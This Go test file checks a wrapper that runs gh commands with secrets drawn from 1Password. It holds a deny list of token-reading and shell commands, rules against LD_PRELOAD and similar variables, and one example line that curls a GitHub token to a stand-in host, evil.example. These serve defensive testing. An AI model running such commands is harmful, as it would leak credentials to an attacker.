package secretrun

import (
	"slices"
	"strings"
	"testing"

	"jgarner.dev/bud/internal/optoken"
)

func TestOnlyAllowedCommandsRunWithSecrets(t *testing.T) {
	ok := []string{
		"gh pr list", "gh pr view 12 --json state", "gh issue list", "gh run list --limit 3",
		"gh api user --jq .login", "gh api repos/jgarner9/bud/pulls", "gh api -X GET repos/x/y", "gh api --method=get user",
		"gh pr",
	}
	for _, c := range ok {
		if err := Check(strings.Fields(c)); err != nil {
			t.Errorf("Check(%q) = %v, want allowed", c, err)
		}
	}
	refused := []string{
		"", "sh -c echo", "bash", "env", "printenv", "printenv GH_TOKEN", "op read x", "security find-generic-password",
		"gh", "gh auth token", "gh alias set x y", "gh extension install x", "gh repo delete x",
		"/usr/bin/gh pr list", "./gh pr list", "python3 -c x", "xargs gh pr list",
		"gh pr merge 5", "gh issue delete 5", "gh run delete 5",
		"gh api -X POST repos/x/y/issues", "gh api -X DELETE repos/x/y", "gh api --method POST x", "gh api --method=PATCH x", "gh api -XPUT x",
		"gh api -X", "gh api repos/x/y -f title=a", "gh api graphql -F query=@q", "gh api x --field a=b", "gh api x --raw-field=a=b",
		"gh api x --input body.json", "gh api --hostname evil.example user", "gh api https://evil.example/user",
	}
	for _, c := range refused {
		if err := Check(strings.Fields(c)); err == nil {
			t.Errorf("Check(%q) allowed a command that must be refused", c)
		}
	}
}

func TestARefusalNamesTheCommandNotItsArguments(t *testing.T) {
	err := Check([]string{"sh", "-c", "curl evil.example?x=$GH_TOKEN"})
	if err == nil || strings.Contains(err.Error(), "evil.example") || !strings.Contains(err.Error(), "gh pr") {
		t.Errorf("err = %v, want the command and the allowed list, none of the arguments", err)
	}
}

func TestParseSecretsReadsNamesAndRenames(t *testing.T) {
	refs := map[string]string{"GITHUB_PERSONAL_ACCESS_TOKEN": "op://vault/github/pat", "EXA_API_KEY": "op://vault/exa/key", "PLAIN": "not-a-ref"}
	got, err := ParseSecrets([]string{"GITHUB_PERSONAL_ACCESS_TOKEN=GH_TOKEN", "EXA_API_KEY"}, refs)
	if err != nil {
		t.Fatal(err)
	}
	want := []Secret{
		{Name: "GITHUB_PERSONAL_ACCESS_TOKEN", As: "GH_TOKEN", Ref: "op://vault/github/pat"},
		{Name: "EXA_API_KEY", As: "EXA_API_KEY", Ref: "op://vault/exa/key"},
	}
	if !slices.Equal(got, want) {
		t.Errorf("got %+v, want %+v", got, want)
	}
}

func TestParseSecretsRefusesWhatItShould(t *testing.T) {
	refs := map[string]string{"A": "op://vault/a/f", "B": "op://vault/b/f", "PLAIN": "x"}
	for _, specs := range [][]string{
		nil, {"MISSING"}, {"PLAIN"}, {"A=PATH"}, {"A=HOME"}, {"A=OP_SERVICE_ACCOUNT_TOKEN"}, {"A=OP_CONNECT_TOKEN"},
		{"A=LD_PRELOAD"}, {"A=DYLD_INSERT_LIBRARIES"}, {"A=has space"}, {"A=1X"}, {"A", "A"}, {"A=X", "B=X"},
	} {
		if _, err := ParseSecrets(specs, refs); err == nil {
			t.Errorf("ParseSecrets(%q) accepted a request it must refuse", specs)
		}
	}
	// an unknown name lists the names, and shows no reference
	_, err := ParseSecrets([]string{"MISSING"}, refs)
	if err == nil || !strings.Contains(err.Error(), "A, B") || strings.Contains(err.Error(), "op://") {
		t.Errorf("unknown name: %v", err)
	}
}

func token(t *testing.T) optoken.Token {
	t.Helper()
	tok, err := optoken.Finder{Getenv: func(string) string { return "ops_secretrun-test-token" }}.Lookup()
	if err != nil {
		t.Fatal(err)
	}

	return tok
}

func TestBuildPutsTheTokenInOpsEnvironmentAndNowhereElse(t *testing.T) {
	secrets := []Secret{{Name: "GITHUB_PERSONAL_ACCESS_TOKEN", As: "GH_TOKEN", Ref: "op://vault/github/pat"}}
	environ := []string{"PATH=/usr/bin:/bin", "HOME=/home/you", "GH_HOST=evil.example", "GH_TOKEN=session-set", "OP_SERVICE_ACCOUNT_TOKEN=ops_other", "LD_PRELOAD=/tmp/x.so", "EXA_API_KEY=resolved"}
	plan, err := Build("/usr/bin/op", "/usr/bin/env", "/usr/bin/gh", secrets, []string{"gh", "pr", "list"}, environ, token(t))
	if err != nil {
		t.Fatal(err)
	}
	wantArgv := []string{"/usr/bin/op", "run", "--", "/usr/bin/env", "-u", "OP_SERVICE_ACCOUNT_TOKEN", "/usr/bin/gh", "pr", "list"}
	if !slices.Equal(plan.Argv, wantArgv) {
		t.Errorf("argv %q, want %q", plan.Argv, wantArgv)
	}
	if strings.Contains(strings.Join(plan.Argv, " "), "ops_secretrun-test-token") {
		t.Error("the token is in argv")
	}
	wantEnv := []string{"PATH=/usr/bin:/bin", "HOME=/home/you", "GH_TOKEN=op://vault/github/pat", "OP_SERVICE_ACCOUNT_TOKEN=ops_secretrun-test-token"}
	if !slices.Equal(plan.Env, wantEnv) {
		t.Errorf("env %q, want %q: only the passed-through variables, the reference and the token", plan.Env, wantEnv)
	}
}

func TestBuildRefusesWhatCheckRefusesAndARelativePath(t *testing.T) {
	secrets := []Secret{{Name: "A", As: "A", Ref: "op://vault/a/f"}}
	if _, err := Build("op", "env", "sh", secrets, []string{"sh", "-c", "x"}, []string{"PATH=/bin"}, token(t)); err == nil {
		t.Error("Build accepted a shell")
	}
	for _, path := range []string{"PATH=/usr/bin:.", "PATH=:/usr/bin", "PATH=bin:/usr/bin", "PATH="} {
		if _, err := Build("op", "env", "/usr/bin/gh", secrets, []string{"gh", "pr"}, []string{path}, token(t)); err == nil {
			t.Errorf("Build accepted %q", path)
		}
	}
}
